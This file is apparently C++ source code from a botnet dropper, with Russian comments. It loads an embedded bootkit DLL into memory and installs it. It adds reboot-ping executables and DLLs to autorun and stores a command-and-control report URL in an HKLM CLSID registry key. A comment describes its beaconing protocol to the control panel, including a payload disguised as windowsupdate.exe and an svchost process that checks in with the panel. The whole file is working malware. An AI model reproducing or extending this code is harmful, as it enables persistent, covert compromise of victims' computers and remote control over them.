//---------------------------------------------------------------------------
#include <Shlobj.h>

#include "BotEvents.h"
#include "GetApi.h"
//#include "BotDebug.h"
#include "Strings.h"
#include "Utils.h"
#include "Modules.h"
#include "Loader.h"

#include "exploit\exploit.h"

#include "inject.h"
#include "unhook.h"
#include "DllLoader.h"
#include "getsec.h"
#include "BotUtils.h"
#include "Memory.h"

#include "strings.h"
#include "dprint.h"

void AddRebootPingToAutorun()
{
	PP_DPRINTF(L"AddRebootPingToAutorun: started.");

	DWORD size;	
	PVOID body = GetSectionData("REBOOT_PING", &size);
	
	if (body)
	{
		PP_DPRINTF(L"AddRebootPingToAutorun: ping body found. Adding to autorun.");
		AddToAutoRun(body, size);
	}

	PP_DPRINTF(L"AddRebootPingToAutorun: finished.");
}

void AddRebootPingDllToAutorun()
{
	DWORD dll_body_size = 0;
	void* dll_body = NULL;

	PP_DPRINTF(L"AddRebootPingDllToAutorun: started.");
	
	dll_body = GetSectionData("REBOOT_PING_DLL", &dll_body_size);
	PP_RETURNIF1(dll_body == NULL);
	PP_RETURNIF1(dll_body_size == 0);

	HMEMORYMODULE dll = MemoryLoadLibrary(dll_body);

	PP_RETURNIF1(dll == NULL);

	typedef BOOL (WINAPI* InstallFunction)(const void* dll_body, DWORD dll_body_size);

	InstallFunction install = NULL;

	install = (InstallFunction)MemoryGetProcAddress(dll, "Install");

	PP_RETURNIF1(install == NULL);

	// 123_d начало вызова Install для установки ping dll
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("123_d"));

	BOOL install_result = install(dll_body, dll_body_size);
	if (install_result)
	{
		// 124_d вызов Install для установки ping dll вернул TRUE
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("124_d"));
	}

	PP_DPRINTF(L"AddRebootPingDllToAutorun: finished with install_result=%d.", install_result);
}

void GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
{
	CHAR BotUid[200];
	
	m_memset(BotUid, 0, sizeof(BotUid));
	m_memset(UrlBuffer, 0, UrlBufferSize);

	GenerateUid(BotUid);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
	
	PP_DPRINTF(L"GetDriverUrl: url='%S':%u", URL, STR::Length(URL));

	PP_RETURNIF1(UrlBufferSize < (STR::Length(URL) - 1));

	m_lstrcpy(UrlBuffer, URL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

bool SaveUrlForBootkitDriver()
{
	WCHAR  key_path[] = L"SOFTWARE\\Classes\\CLSID\\{8CB0A413-0585-4886-B110-004B3BCAA9A8}";
	CHAR   url[500];
	DWORD	 url_length = 0;
	HKEY   key;
	DWORD  opt = 0;

	GetDriverUrl(url, sizeof(url));

	DWORD key_created = (DWORD)RegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, NULL, 0, KEY_WRITE, NULL, &key, &opt);
	PP_RETURNIF2(key_created != ERROR_SUCCESS, false);

	// Сохраняем на всякий пожарный с 0 в конце
	DWORD url_value_set = (DWORD)RegSetValueExW(key, L"ID", 0, REG_BINARY, (const BYTE*)&url[0], 
		(DWORD)plstrlenA(url));
	PP_RETURNIF2(url_value_set != ERROR_SUCCESS, false);

	PP_DPRINTF(L"SaveUrlForBootkit: Url key set (url=%S).", url);

	RegCloseKey(key);
	return true;
}


/*
1. До ребута дропер отстукивает передавая ОС SP битность весь инстал буткита делается из проводника,
если залочат бота на пункте 1,то 2,3 не произойдут,и мы увидим. сразу в бд регистрируется бот и у 
него стату bkinstal= False
http://localhost/geter/index.php?cmd=beforerbt&uid=test1&os=XP_3_32

2. Ставим буткита:
2.1. bkinstal= False при не удачной инсталяции,длл возвращает код ошибки до 6 цифр,либо может даже ничего не вернуть,тогда в таблице писать пустоту.
3. bkinstal= True

http://localhost/geter/index.php?cmd=bkinstall&uid=test2&val=true/false/код ошибки

3.reboot
тут момент,мы отправляем в принудительный ребут,но он не всегда выполняется.как быть? подождать дня 2 ? предлагаю: запустить отдельный процесс свхоста который каждые 5 минут пишет в админку,I'm not rebooted может это конечно лишнее,но если в течении часа от такого бота был отстук,то можно не учитывать его в стате ботов,которые после ребута не отстучали(смотри пункт 9) 

http://localhost/geter/index.php?cmd=rbt&uid=test2&val=notrbt/true/пустота


4. Cтучит драйвер из стека (каждые 3 минуты,на случай если инет не сразу у юзера стартует) драйвер шлёт гет запрос,в котором передаёт уид HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID 
http://localhost/geter/index.php?cmd=drv&uid=test1&val=true


5. стучит наша длл из свхост (каждые 3 минуты,на случай если инет не сразу у юзера стартует) 

http://localhost/geter/index.php?cmd=dpl&uid=test1&val=true


6. стучит просто ехешник с именем windowsupdate.exe в админку,передавая uid

http://localhost/geter/index.php?cmd=exe&uid=test1&val=true
*/

bool ExplorerStart(PEventData Data)
{
	ULONG ret  = -1;
	UnhookDlls();

	PP_DPRINTF(L"ExplorerStart: doing DebugReportStep1 on start.");
	PP_DBGRPT_FUNCTION_CALL(DebugReportStep1());
	
	PP_DPRINTF(L"ExplorerStart: doing DebugReportUpdateNtldrCheckSum on start.");
	PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());

	PP_DPRINTF(L"ExplorerStart: doing sending system information.");
	PP_DBGRPT_FUNCTION_CALL(DebugReportCreateConfigReportAndSend());
	
	// 110_d - запуск ExplorerStart
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("110_d"));

	PP_DPRINTF(L"ExplorerStart: looking for setup dll...");

	DWORD BkSize;	
	PVOID BkImage = GetSectionData("BkDll",&BkSize);
	
	if (BkImage)
	{
		PP_DPRINTF(L"ExplorerStart: setup dll found.");
		HMEMORYMODULE hLib = MemoryLoadLibrary(BkImage);
		
		PP_DPRINTF(L"ExplorerStart: MLoadLibrary() result=0x%X", hLib);
		if (hLib == NULL) return false;
		
		bool uid_saved = SaveUrlForBootkitDriver();
		PP_DPRINTF(L"ExplorerStart: UID saved for bootkit.(result=%d)", uid_saved);


		PP_DPRINTF(L"ExplorerStart: looking for setup function ....");
		ULONG (*BkInstall)();
		if ( BkInstall = (ULONG(*)())MemoryGetProcAddress(hLib,"BkInstall")  )
		{
			// 111_d - запуск установки
			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("111_d"));

			PP_DPRINTF(L"ExplorerStart: setup function found 0x%X. Calling it.", BkInstall);
			ret = BkInstall();
			PP_DPRINTF(L"ExplorerStart: setup function result = 0x%X", ret);

			if (ret == ERROR_SUCCESS)
			{
				//112_d установка успешна
				PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("112_d"));

				PP_DPRINTF(L"ExplorerStart: add pinger to autorun...");
				AddRebootPingToAutorun();
				AddRebootPingDllToAutorun();
			}

			PP_DPRINTF(L"ExplorerStart: doing DebugReportStep2");
			PP_DBGRPT_FUNCTION_CALL(DebugReportStep2(ret));
		}
		MemoryFreeLibrary(hLib);

		PP_DPRINTF(L"ExplorerStart: returning %d.", (ret == ERROR_SUCCESS));
		return (ret == ERROR_SUCCESS);
	}
	PP_DPRINTF(L"ExplorerStart: returning false.");
	return false;
}

void ApplicationStarted(PEventData Data)
{
};
